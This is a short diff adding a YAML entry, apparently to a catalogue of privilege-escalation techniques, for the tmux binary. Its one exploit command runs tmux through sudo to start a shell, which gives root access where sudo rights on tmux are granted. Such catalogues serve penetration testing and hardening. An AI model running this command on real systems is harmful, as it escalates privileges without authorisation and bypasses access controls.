@@ -1,0 +1,4 @@
+name: tmux
+binary_path: /usr/bin/tmux
+exploit_cmds:
+- sudo /usr/bin/tmux -c /bin/sh
